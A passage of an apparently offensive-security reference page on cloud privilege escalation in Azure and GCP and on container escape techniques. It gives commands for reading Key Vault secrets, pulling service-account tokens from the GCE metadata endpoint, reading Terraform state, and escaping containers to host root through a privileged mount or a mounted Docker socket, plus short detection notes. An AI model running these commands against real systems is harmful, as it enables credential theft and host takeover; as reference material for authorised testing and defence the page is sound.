+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> keyvault</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> keyvault</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secret</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --vault-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> VAULT</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> keyvault</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> secret</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> show</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --vault-name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> VAULT</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --name</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> SECRET</span></span></code></pre></figure>
+<p>Access policies vs RBAC models; managed identity often has get/list on secrets.</p>
+<h3 id="38-vm-run-command--extensions">3.8 VM Run Command / Extensions<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#38-vm-run-command--extensions" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>With compute rights:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">az</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> vm</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> run-command</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> invoke</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -g</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> RG</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -n</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> VM</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --command-id</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> RunShellScript</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --scripts</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;id&quot;</span></span></code></pre></figure>
+<h3 id="39-token-theft">3.9 Token Theft<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#39-token-theft" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Azure CLI tokens on disk (<code>~/.azure</code>)</li>
+<li>Primary refresh tokens (PRT) on AAD-joined devices</li>
+<li>RoadTools / TokenTactics research tooling for labs</li>
+</ul>
+<h3 id="310-tools">3.10 Tools<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#310-tools" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li><strong>ROADTools</strong></li>
+<li><strong>Stormspotter</strong> (Azure attack graph — archive awareness)</li>
+<li><strong>AzureHound</strong> (BloodHound collection)</li>
+<li><strong>MicroBurst</strong> / <strong>PowerZure</strong></li>
+<li><strong>Az</strong> PowerShell / Azure CLI</li>
+</ul>
+<hr/>
+<h2 id="4-gcp-privilege-escalation">4. GCP Privilege Escalation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#4-gcp-privilege-escalation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="41-identities">4.1 Identities<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#41-identities" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Google accounts / Cloud Identity users</li>
+<li>Service accounts</li>
+<li>Workload identity federations</li>
+</ul>
+<h3 id="42-metadata-credentials">4.2 Metadata Credentials<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#42-metadata-credentials" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>From GCE:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Metadata-Flavor: Google&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">curl</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> &quot;Metadata-Flavor: Google&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="string"> \</span></span>
+<span data-line><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string">  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email</span></span></code></pre></figure>
+<h3 id="43-enumeration">4.3 Enumeration<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#43-enumeration" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> auth</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> config</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> projects</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> service-accounts</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> list</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> projects</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-iam-policy</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> PROJECT</span></span></code></pre></figure>
+<h3 id="44-common-privesc-themes">4.4 Common Privesc Themes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#44-common-privesc-themes" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="table-container"><table><thead><tr><th>Permission / role</th><th>Abuse</th></tr></thead><tbody><tr><td><code>iam.serviceAccountUser</code> + resource run</td><td>Run as SA on GCE/GCF/GKE</td></tr><tr><td><code>iam.serviceAccountTokenCreator</code></td><td>Mint tokens for SA</td></tr><tr><td><code>iam.serviceAccountKeys.create</code></td><td>Long-lived key for SA</td></tr><tr><td><code>resourcemanager.projects.setIamPolicy</code></td><td>Grant self owner</td></tr><tr><td><code>deploymentmanager</code> / <code>cloudbuild</code> edit</td><td>Deploy privileged resources</td></tr><tr><td><code>storage.objects</code> on sensitive buckets</td><td>Creds in TF state, backups</td></tr><tr><td><code>secretmanager.versions.access</code></td><td>Read secrets</td></tr><tr><td><code>container.admin</code></td><td>Cluster admin → nodes</td></tr></tbody></table></div>
+<h3 id="45-service-account-impersonation">4.5 Service Account Impersonation<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#45-service-account-impersonation" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> iam</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> service-accounts</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> get-access-token</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> SA@PROJECT.iam.gserviceaccount.com</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># or</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gcloud</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> print-access-token</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --impersonate-service-account=SA@...</span></span></code></pre></figure>
+<h3 id="46-cloud-storage">4.6 Cloud Storage<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#46-cloud-storage" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gsutil</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ls</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">gsutil</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> gs://bucket/terraform.tfstate</span></span></code></pre></figure>
+<p>Terraform state files frequently contain secrets.</p>
+<h3 id="47-cloud-functions--run">4.7 Cloud Functions / Run<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#47-cloud-functions--run" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Update source / env vars if permitted; attach privileged SA at deploy.</p>
+<h3 id="48-tools">4.8 Tools<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#48-tools" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li><strong>GCP Privilege Escalation</strong> checklists (Rhino / HackTricks Cloud)</li>
+<li><strong>gcloud</strong> + custom scripts</li>
+<li><strong>Forseti</strong> / SCC for defensive inventory</li>
+</ul>
+<hr/>
+<h2 id="5-container-escape-techniques">5. Container Escape Techniques<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#5-container-escape-techniques" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<h3 id="51-am-i-in-a-container">5.1 Am I in a Container?<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#51-am-i-in-a-container" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /proc/1/cgroup</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /.dockerenv</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">mount</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function"> head</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">capsh</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --print</span></span></code></pre></figure>
+<h3 id="52-privileged-containers">5.2 Privileged Containers<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#52-privileged-containers" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Often can see host devices</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ls</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /dev</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">fdisk</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -l</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">mount</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /dev/sda1</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /mnt</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">chroot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /mnt</span></span></code></pre></figure>
+<p><code>--privileged</code> disables most isolation — treat as host root equivalent.</p>
+<h3 id="53-docker-socket-mount">5.3 Docker Socket Mount<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#53-docker-socket-mount" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ls</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -l</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /var/run/docker.sock</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">docker</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> unix:///var/run/docker.sock</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> ps</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">docker</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -H</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> unix:///var/run/docker.sock</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> run</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -v</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /:/host</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> -it</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> alpine</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> chroot</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /host</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> sh</span></span></code></pre></figure>
+<p>Even without CLI, use curl API against the socket.</p>
+<h3 id="54-dangerous-capabilities">5.4 Dangerous Capabilities<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#54-dangerous-capabilities" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p><code>CAP_SYS_ADMIN</code>, <code>CAP_SYS_PTRACE</code>, <code>CAP_DAC_OVERRIDE</code>, <code>CAP_SYS_MODULE</code> inside containers enable multiple escape classes (mount, ptrace host pidns if shared, etc.).</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">cat</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> /proc/self/status</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;" data-token-type="operator"> |</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function"> grep</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> Cap</span></span></code></pre></figure>
+<h3 id="55-host-pid--network--ipc-namespaces">5.5 Host PID / Network / IPC Namespaces<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#55-host-pid--network--ipc-namespaces" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># If --pid=host</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">ps</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;" data-token-type="string"> aux</span></span>
+<span data-line><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;" data-token-type="comment"># Potential to enter host processes / debug</span></span></code></pre></figure>
+<h3 id="56-writable-host-mounts">5.6 Writable Host Mounts<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#56-writable-host-mounts" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Bind mounts of <code>/</code>, <code>/var/run/docker.sock</code>, <code>/etc</code>, host cron dirs, or Kubernetes node paths → write SSH keys / cron / binaries.</p>
+<h3 id="57-cgroups-release_agent-historical-class">5.7 cgroups release_agent (Historical Class)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#57-cgroups-release_agent-historical-class" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Requires specific capability and mount conditions; still taught in labs — validate kernel/container runtime hardening.</p>
+<h3 id="58-runc--container-runtime-cves">5.8 Runc / Container Runtime CVEs<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#58-runc--container-runtime-cves" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<p>Track CVEs in runc, containerd, CRI-O (e.g., historical escapes). Version enumeration:</p>
+<figure data-rehype-pretty-code-figure><pre tabindex="0" data-language="bash" data-theme="github-light github-dark"><code data-language="bash" data-theme="github-light github-dark" style="display:grid;"><span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">runc</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --version</span></span>
+<span data-line><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;" data-token-type="function">containerd</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;" data-token-type="value"> --version</span></span></code></pre></figure>
+<h3 id="59-detection-notes">5.9 Detection Notes<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#59-detection-notes" class="internal internal-link"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h3>
+<ul>
+<li>Containers running privileged in prod</li>
+<li>Socket mounts in compose/k8s manifests</li>
+<li>Unexpected hostPath volumes</li>
+</ul>
+<hr/>
